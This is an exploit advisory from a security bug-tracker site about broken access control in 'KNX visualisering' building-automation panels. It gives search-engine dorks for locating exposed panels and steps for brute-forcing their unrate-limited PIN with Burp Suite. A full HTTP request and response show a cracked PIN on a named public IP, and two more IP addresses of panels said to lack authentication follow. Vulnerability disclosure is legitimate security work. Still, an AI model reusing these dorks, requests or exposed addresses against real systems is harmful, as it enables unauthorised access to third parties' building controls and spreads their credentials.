---
title: KNX visualisering - Broken Access Control
url: https://cxsecurity.com/issue/WLB-2026060011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-15
fetch_date: 2026-06-16T07:14:39.182273
---

# KNX visualisering - Broken Access Control

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **KNX visualisering - Broken Access Control** **2026.06.15**  Credit:  **[parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo%2B/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: KNX visualisering - Broken Access Control
# Date: 6/10/2026
# Exploit Author: parsa rezaie khiabanloo
# Vendor Homepage: KNX visualisering (https:/www.knxgroep.nl)
# Version: KNX visualisering
# Tested on: Windows/Linux
Step 1 : Attacker can using these dorks then can find the KNX panel .
Shodan : title:"KNX visualisering" OR https://www.shodan.io/search?query=title%3A%22KNX+visualisering%22
ZoomEye : "KNX visualisering" OR https://www.zoomeye.ai/searchResult?q=IktOWCB2aXN1YWxpc2VyaW5nIg%3D%3D
Fofa : ("KNX visualisering") && icon\_hash=="2019991370" OR https://en.fofa.info/result?qbase64=KCJLTlggdmlzdWFsaXNlcmluZyIpICYmIGljb25faGFzaD09IjIwMTk5OTEzNzAi
Step 2 : We Found pincode panel and they dont have RateLimit so attacker can brute force it using tools like BrupSuite.
The attacker can try several numbers to know what the length of the number is for that panel, for example, one panel is 4 digits or another panel is 6 digits.
Notic : Most panels Dont need authentication
Example :
Attacker used the dorks and founded this IP 62.163.74.206 after that attacker use the Burp Suite to brute force it .
Request :
POST /scada-vis/pin?return=index HTTP/1.1
Host: 62.163.74.206
Content-Length: 10
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://62.163.74.206
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://62.163.74.206/scada-vis/pin?return=index
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
pin=123456
In the up request attack will know the pin length is 6 so now attacker going to try 6 numbers from 000000 to 999999 .
I founded the pin and that is 200908 .
Response :
HTTP/1.1 302 Moved Temporarily
Date: Wed, 10 Jun 2026 07:26:40 GMT
Content-Type: text/html
Content-Length: 126
Connection: keep-alive
Set-Cookie: pin=200908; Path=/
Location: /scada-vis/index
<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
</body>
</html>
Some Panels without authentication :
https://85.147.34.42/scada-vis
https://185.72.160.230/scada-vis

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top